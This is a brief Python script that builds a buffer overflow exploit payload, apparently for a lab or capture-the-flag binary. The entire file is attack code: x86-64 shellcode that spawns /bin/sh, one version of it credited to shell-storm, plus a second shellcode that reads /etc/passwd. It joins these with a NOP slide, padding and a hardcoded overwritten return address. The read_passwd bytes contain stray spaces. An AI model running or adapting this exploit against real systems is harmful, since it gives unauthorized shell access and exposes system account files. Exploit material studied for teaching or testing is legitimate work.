#!/usr/bin/python

# the shell code is from http://shell-storm.org/shellcode/files/shellcode-806.php
#shell_code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
#shell_code = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
shell_code = "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe3\x08\x48\xc1\xeb\x08\x53\x48\xc7\xc0\x3b\x11\x11\x11\x48\x89\xe7\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05"
read_passwd = "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31 \xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34 \x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05 \x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f \x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74 \x63\x2f\x70\x61\x73\x73\x77\x64\x41"
payload_len = 280
#target_addr = "\x00\x00\x7f\xff\xff\xff\xcd\x30"
target_addr = "\x00\x00\x7f\xff\xff\xff\xd2\xd0"

nop_len = 24
nop_slide = "\x90" * nop_len

payload = nop_slide + shell_code + 'A'*(payload_len - nop_len - 82) + target_addr[::-1]

print payload

